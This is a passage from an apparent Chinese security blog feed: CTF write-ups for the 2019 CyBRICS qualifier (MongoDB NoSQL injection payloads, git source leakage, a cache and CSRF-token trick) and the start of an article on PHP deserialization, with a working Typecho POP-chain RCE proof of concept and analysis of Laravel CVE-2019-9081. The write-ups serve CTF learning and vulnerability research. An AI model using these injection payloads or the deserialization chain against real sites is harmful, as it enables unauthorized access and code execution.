requests.post(url,data=data,cookies=cookie,timeout=<span class="number">3</span>)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">200</span>):</span><br><span class="line">USD = GetUSD()</span><br><span class="line"><span class="keyword">print</span> USD</span><br><span class="line">USD_to_BTC(USD)</span><br><span class="line">BTC = GetBTC()</span><br><span class="line"><span class="keyword">print</span> BTC</span><br><span class="line">BTC_to_USD(BTC)</span><br></pre></td></tr></table></figure></p><p>通过来回转钱，跑差不多十分钟就够$1 USD，可以购买flag了</p><h2 id="Caesaref"><a href="#Caesaref" class="headerlink" title="Caesaref"></a>Caesaref</h2><p>这题本来设置的难度为hard，但因为出现了非预期，我们发出的请求可以在服务器收到，但回带上admin cookie，所以我们可以直接更改cookie进入admin页面，导致我们可以直接点击show flag获取flag。<br>修复版本见下面的Fixaref，这题就不再详解。</p><h2 id="NopeSQL"><a href="#NopeSQL" class="headerlink" title="NopeSQL"></a>NopeSQL</h2><p>扫描发现：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://173.199.118.226/.git/HEAD</span><br></pre></td></tr></table></figure></p><p>进行githacker源码泄露，拿到源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GitHacker.py http://173.199.118.226/.git/</span><br></pre></td></tr></table></figure></p><p>简单审视代码，发现是php为后端，mongodb作为数据库。<br>题目分为两部分，第一部分是需要先成功登入<br><img src="/images/2019-07-22-10-49-58.png" alt=""><br>我们注意到在sql拼接处，为加任何过滤：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$raw_query = <span class="string">'&#123;"username": "'</span>.$username.<span class="string">'", "password": "'</span>.$password.<span class="string">'"&#125;'</span>;</span><br></pre></td></tr></table></figure></p><p>题目会直接拼接我们传入的username和password。但因为后续有json_decode，所以导致我们并不能使用传统方法进行Bypass:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$document = $collection-&gt;findOne(json_decode($raw_query));</span><br></pre></td></tr></table></figure></p><p>这里我们的想法本来为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=admin</span><br><span class="line">password[$ne]=1</span><br></pre></td></tr></table></figure></p><p>这样即查找用户名为admin，密码不为1的用户，那么显然管理员密码不可能为1，那么可以成功匹配到管理员用户，但这里由于json_decode，我们这样直接传参不会奏效，同时也不能使用//进行注释闭合。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">1</span>);</span><br><span class="line">$username=<span class="string">'admin'</span>;</span><br><span class="line">$password[$ne]=<span class="string">'1'</span>;</span><br><span class="line">$raw_query = <span class="string">'&#123;"username": "'</span>.$username.<span class="string">'", "password": "'</span>.$password.<span class="string">'"&#125;'</span>;</span><br><span class="line">var_dump(json_decode($raw_query));</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-07-22-10-54-55.png" alt=""><br>但我们可以构造出如下脚本，来生成我们想要的exp：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">1</span>);</span><br><span class="line">$password = <span class="keyword">array</span>(<span class="string">'$ne'</span> =&gt; <span class="string">'1'</span>);</span><br><span class="line">$res = <span class="keyword">array</span>(<span class="string">'username'</span> =&gt; <span class="string">'admin'</span>, <span class="string">'password'</span> =&gt; $password);</span><br><span class="line">var_dump(json_encode($res));</span><br></pre></td></tr></table></figure></p><p>得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&#123;&quot;$ne&quot;:&quot;1&quot;&#125;&#125;</span><br></pre></td></tr></table></figure></p><p>所以我们的目标是构造出这样的exp，即可解析出password[$ne]=1。<br>那么我们在password字段注入即可：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa&quot;, &quot;password&quot;: &#123;&quot;$ne&quot;: &quot;test&quot;&#125;, &quot;username&quot;: &quot;admin</span><br></pre></td></tr></table></figure></p><p>即：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username = admin</span><br><span class="line">password = aaa&quot;, &quot;password&quot;: &#123;&quot;$ne&quot;: &quot;test&quot;&#125;, &quot;username&quot;: &quot;admin</span><br></pre></td></tr></table></figure></p><p>这样可以得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;aaa&quot;, &quot;password&quot;: &#123;&quot;$ne&quot;: &quot;test&quot;&#125;, &quot;username&quot;: &quot;admin&quot;&#125;</span><br></pre></td></tr></table></figure></p><p>这样一来，我们即可搜索到满足条件的管理员用户：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;password&quot;: &#123;&quot;$ne&quot;: &quot;test&quot;&#125;, &quot;username&quot;: &quot;admin&quot;</span><br></pre></td></tr></table></figure></p><p>登入后，来到第二个挑战：<br><img src="/images/2019-07-22-11-03-33.png" alt=""><br>通过查询资料得知，在mongodb的aggregate中，可以使用$cond进行条件语句：<br><img src="/images/2019-07-22-11-05-06.png" alt=""><br>单个条件可以为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[$cond][if][$eq]</span><br></pre></td></tr></table></figure></p><p>如果要使用两个条件，则并列即可：<br><img src="/images/2019-07-22-11-06-04.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[$cond][if][$eq]</span><br><span class="line">[$cond][if][$eq]</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-07-22-11-06-30.png" alt=""><br>那么我们可以利用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if then else</span><br></pre></td></tr></table></figure></p><p>比如当我们匹配到flags时候，就将其移除：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://173.199.118.226/index.php?filter[$cond][if][$eq][]=flags&amp;filter[$cond][if][$eq][]=$category&amp;filter[$cond][then]=$$REMOVE&amp;filter[$cond][else]=$category</span><br></pre></td></tr></table></figure></p><p>发现flags被移除：<br><img src="/images/2019-07-22-10-24-54.png" alt=""><br>在匹配到public时，将其移除：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://173.199.118.226/index.php?filter[$cond][if][$eq][]=public&amp;filter[$cond][if][$eq][]=$category&amp;filter[$cond][then]=$$REMOVE&amp;filter[$cond][else]=$category</span><br></pre></td></tr></table></figure></p><p>发现此时正常：<br><img src="/images/2019-07-22-10-31-15.png" alt=""><br>那么利用条件语句，发现flags时，就输出其title：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://173.199.118.226/index.php?filter[$cond][if][$eq][]=flags&amp;filter[$cond][if][$eq][]=$category&amp;filter[$cond][then]=$title&amp;filter[$cond][else]=$category</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-07-22-10-23-54.png" alt=""><br>从title中我们得知有text，那么读取：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://173.199.118.226/index.php?filter[$cond][if][$eq][]=flags&amp;filter[$cond][if][$eq][]=$category&amp;filter[$cond][then]=$text&amp;filter[$cond][else]=$category</span><br></pre></td></tr></table></figure></p><p>即可拿到flag:<br><img src="/images/2019-07-22-10-23-12.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cybrics&#123;7|-|15 15 4 7E&gt;&lt;7 |=|_49&#125;</span><br></pre></td></tr></table></figure></p><h2 id="Fixaref"><a href="#Fixaref" class="headerlink" title="Fixaref"></a>Fixaref</h2><p>进入页面后，发现可以ask question，本能测试一下远程请求：<br><img src="/images/2019-07-22-10-15-13.png" alt=""><br>收到后，发现是python requests发包，同时注意到http header:<br><img src="/images/2019-07-22-11-10-02.png" alt=""><br>发现了一个奇怪的header，搜索得知，可能和缓存有关，同时依据之前非预期的题目的flag提示：cache is vulnerabilities。那么判定本题应该是利用cache的问题。<br>我们测试让题目自己去访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://95.179.190.31/index.php/skyiscool.js</span><br></pre></td></tr></table></figure></p><p>发现可以管理员的页面：<br><img src="/images/2019-07-22-10-16-35.png" alt=""><br><img src="/images/2019-07-22-10-16-56.png" alt=""><br>那么本能想要拿出flag，测试让题目去请求：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://95.179.190.31/index.php/skyiscool.js?csrf-token=b04d2bc2f3d3654947ba82d59a2b367630743d3447dbc0af46182359f166c4bd&amp;flag=1</span><br></pre></td></tr></table></figure></p><p>但发现我们的flag参数被丢弃：<br><img src="/images/2019-07-22-10-19-18.png" alt=""><br>为了探测他的过滤规则，那么构造如下请求：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1.1.1.1/?a=1&amp;b=2</span><br></pre></td></tr></table></figure></p><p>发现b参数被丢弃：<br><img src="/images/2019-07-22-10-13-43.png" alt=""><br>那么初步判断校验标准应该是只允许传入1个参数，那么思考如何判断参数个数？<br>这里猜测可能是利用&amp;，那么我们尝试把&amp;编码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1.1.1.1/?a=1%26b=2</span><br></pre></td></tr></table></figure></p><p>发现成功：<br><img src="/images/2019-07-22-10-14-11.png" alt=""><br>那么使用如下exp，让题目请求：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://95.179.190.31/index.php/skyiscool.js?csrf-token=b04d2bc2f3d3654947ba82d59a2b367630743d3447dbc0af46182359f166c4bd%26flag=1</span><br></pre></td></tr></table></figure></p><p>发现此时已经带有flag参数：<br><img src="/images/2019-07-22-10-17-55.png" alt=""><br>访问cache页面，拿到flag：<br><img src="/images/2019-07-22-10-18-25.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cybrics&#123;Bu9s_C4N_83_uN1N73Nd3D!&#125;</span><br></pre></td></tr></table></figure></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这次2019 CyBRICS CTF Quals的Web方向题目并不困难，相比WCTF LCBC的Web题，还是后者更有趣XD~</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于嘶吼 https://www.4hou.com/web/19354.html</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;周末参加了LCBC主办的2019 CyBRICS CTF Quals，在金砖五国中，获得了top5的成绩，以下是web的题解。&lt;/p&gt;
&lt;h
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Summary of serialization attacks Part 3</title>
    <link href="http://skysec.top/2019/07/18/Summary-of-serialization-attacks-Part-3/"/>
    <id>http://skysec.top/2019/07/18/Summary-of-serialization-attacks-Part-3/</id>
    <published>2019-07-18T07:30:36.000Z</published>
    <updated>2019-08-02T08:20:55.162Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>接之前的两篇文章：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.4hou.com/web/17835.html</span><br><span class="line">https://www.4hou.com/web/17976.html</span><br></pre></td></tr></table></figure></p><p>之前分别介绍了php序列化攻击的魔法方法、session序列化引擎以及原生类序列化问题。<br>本篇文章则主要从真实案例来看序列化的pop链构造。</p><h2 id="typecho序列化"><a href="#typecho序列化" class="headerlink" title="typecho序列化"></a>typecho序列化</h2><p>这一节就简单说一下构造链，因为之前的文章分析过，可详见：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://skysec.top/2017/12/29/cms%E5%B0%8F%E7%99%BD%E5%AE%A1%E8%AE%A1-typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/</span><br></pre></td></tr></table></figure></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>1.找到入手点__typecho_config：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$config = unserialize(base64_decode(Typecho_Cookie::get(&apos;__typecho_config&apos;)));</span><br></pre></td></tr></table></figure></p><p>2.寻找可用类Typecho_Db:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$db = new Typecho_Db($config[&apos;adapter&apos;], $config[&apos;prefix&apos;]);</span><br></pre></td></tr></table></figure></p><p>3.利用Typecho_Feed魔法方法__toString()：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$config[<span class="string">'adapter'</span>] =&gt; <span class="keyword">new</span> Typecho_Feed()</span><br><span class="line"></span><br><span class="line">class Typecho_Feed __toString()</span><br></pre></td></tr></table></figure></p><p>4.利用Typecho_Request魔法方法__get()：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$item[<span class="string">'author'</span>]-&gt;screenName</span><br><span class="line"></span><br><span class="line">class Typecho_Request  __get()</span><br></pre></td></tr></table></figure></p><p>5.利用get()方法，完成利用链：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get() -&gt; _applyFilter() -&gt; call_user_func</span><br></pre></td></tr></table></figure></p><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_type=<span class="string">'ATOM 1.0'</span>;</span><br><span class="line">    <span class="keyword">private</span> $_items;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_items = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'0'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                <span class="string">'author'</span>=&gt; <span class="keyword">new</span> Typecho_Request())</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_params = <span class="keyword">array</span>(<span class="string">'screenName'</span>=&gt;<span class="string">'phpinfo()'</span>);</span><br><span class="line">    <span class="keyword">private</span> $_filter = <span class="keyword">array</span>(<span class="string">'assert'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$poc = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">'adapter'</span>=&gt;<span class="keyword">new</span> Typecho_Feed(),</span><br><span class="line"><span class="string">'prefix'</span>=&gt;<span class="string">'typecho'</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($poc));</span><br></pre></td></tr></table></figure><h2 id="laravel序列化"><a href="#laravel序列化" class="headerlink" title="laravel序列化"></a>laravel序列化</h2><p>Laravel是一套简洁、优雅的PHP Web开发框架(PHP Web Framework)，若其本身出现漏洞，则对使用响应框架开发的网站影响是致命的。而这里就将分析laravel框架序列化RCE，CVE编号：CVE-2019-9081，受影响范围：laravel &gt;= 5.7。</p><h3 id="类名加载"><a href="#类名加载" class="headerlink" title="类名加载"></a>类名加载</h3><p>我们首先随便构造一段序列化：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sky</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $sky=<span class="string">'test'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$sky = <span class="keyword">new</span> sky();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($sky));</span><br><span class="line"></span><br><span class="line"><span class="comment"># O%3A3%3A%22sky%22%3A1%3A%7Bs%3A3%3A%22sky%22%3Bs%3A4%3A%22test%22%3B%7D</span></span><br></pre></td></tr></table></figure></p><p>我们传入laravel，并进行反序列化，可以看到load方法试图加载我们随便输入的sky类，首先在$facadeNamespace中寻找指定类名：<br><img src="/images/2019-07-18-16-14-05.png" alt=""><img src="/images/2019-07-18-16-14-16.png" alt=""><br>如果找到，则会通过loadFacade进行加载，否则则进入loadClass进行class map查找，在vendor目录下寻找所需类：<br><img src="/images/2019-07-18-16-04-45.png" alt=""><br><img src="/images/2019-07-18-16-18-25.png" alt=""><br>但是并不能找到sky类，最后会return false。<br>最后查看是否class名以Swift_开头：<br><img src="/images/2019-07-18-16-06-04.png" alt=""><br>最后因为找不到对应类的定义，所以并不能成功进入反序列化流程。<br>但如果我们用一个存在的类，可以明显发现在findFile函数的classMap中找到了相关类，并返回进行了include：<br><img src="/images/2019-07-18-16-35-36.png" alt=""><br><img src="/images/2019-07-18-16-36-22.png" alt=""></p><h3 id="危险类挖掘"><a href="#危险类挖掘" class="headerlink" title="危险类挖掘"></a>危险类挖掘</h3><p>挖掘一个框架的新漏洞，从框架新加入的代码入手是一个很好的思路。我们注意到laravel在5.7之后加入了PendingCommand:<br><img src="/images/2019-07-18-16-44-20.png" alt=""><br>值得注意的是，我们查到该文件，其定义了PendingCommand类，同时注意到其两个方法：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Execute the command.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> int</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Handle the object's destruction.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;hasExecuted) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>非常有意思的是，该类有魔法方法__destruct，而该魔法方法会调用run函数，而run函数可以进行执行命令。<br>我们查看其构造方式:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($command, $parameters,$class,$app)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;command = $command;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;parameters = $parameters;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test=$class;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;app=$app;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>一共需要用到4个属性，我们查阅对应手册：<br><img src="/images/2019-07-18-19-03-19.png" alt=""></p><h3 id="run-amp-mockConsoleOutput"><a href="#run-amp-mockConsoleOutput" class="headerlink" title="run &amp; mockConsoleOutput"></a>run &amp; mockConsoleOutput</h3><p>我们跟进run方法：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hasExecuted = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mockConsoleOutput();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            $exitCode = <span class="keyword">$this</span>-&gt;app[Kernel::class]-&gt;call(<span class="keyword">$this</span>-&gt;command, <span class="keyword">$this</span>-&gt;parameters);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoMatchingExpectationException $e) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($e-&gt;getMethodName() === <span class="string">'askQuestion'</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;test-&gt;fail(<span class="string">'Unexpected question "'</span>.$e-&gt;getActualArguments()[<span class="number">0</span>]-&gt;getQuestion().<span class="string">'" was asked.'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> $e;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;expectedExitCode !== <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test-&gt;assertEquals(</span><br><span class="line">                <span class="keyword">$this</span>-&gt;expectedExitCode, $exitCode,</span><br><span class="line">                <span class="string">"Expected status code &#123;$this-&gt;expectedExitCode&#125; but received &#123;$exitCode&#125;."</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $exitCode;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>关注到第一个关键点：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;mockConsoleOutput();</span><br></pre></td></tr></table></figure></p><p>我们跟进该函数：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">mockConsoleOutput</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $mock = Mockery::mock(OutputStyle::class.<span class="string">'[askQuestion]'</span>, [</span><br><span class="line">            (<span class="keyword">new</span> ArrayInput(<span class="keyword">$this</span>-&gt;parameters)), <span class="keyword">$this</span>-&gt;createABufferedOutputMock(),</span><br><span class="line">        ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;test-&gt;expectedQuestions <span class="keyword">as</span> $i =&gt; $question) &#123;</span><br><span class="line">            $mock-&gt;shouldReceive(<span class="string">'askQuestion'</span>)</span><br><span class="line">                -&gt;once()</span><br><span class="line">                -&gt;ordered()</span><br><span class="line">                -&gt;with(Mockery::on(<span class="function"><span class="keyword">function</span> <span class="params">($argument)</span> <span class="title">use</span> <span class="params">($question)</span> </span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> $argument-&gt;getQuestion() == $question[<span class="number">0</span>];</span><br><span class="line">                &#125;))</span><br><span class="line">                -&gt;andReturnUsing(<span class="function"><span class="keyword">function</span> <span class="params">()</span> <span class="title">use</span> <span class="params">($question, $i)</span> </span>&#123;</span><br><span class="line">                    <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;test-&gt;expectedQuestions[$i]);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> $question[<span class="number">1</span>];</span><br><span class="line">                &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;app-&gt;bind(OutputStyle::class, <span class="function"><span class="keyword">function</span> <span class="params">()</span> <span class="title">use</span> <span class="params">($mock)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> $mock;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>首先是第一步：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$mock = Mockery::mock(OutputStyle::class.<span class="string">'[askQuestion]'</span>, [</span><br><span class="line">            (<span class="keyword">new</span> ArrayInput(<span class="keyword">$this</span>-&gt;parameters)), <span class="keyword">$this</span>-&gt;createABufferedOutputMock(),</span><br><span class="line">        ]);</span><br></pre></td></tr></table></figure></p><p>我们跟进createABufferedOutputMock:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">createABufferedOutputMock</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $mock = Mockery::mock(BufferedOutput::class.<span class="string">'[doWrite]'</span>)</span><br><span class="line">                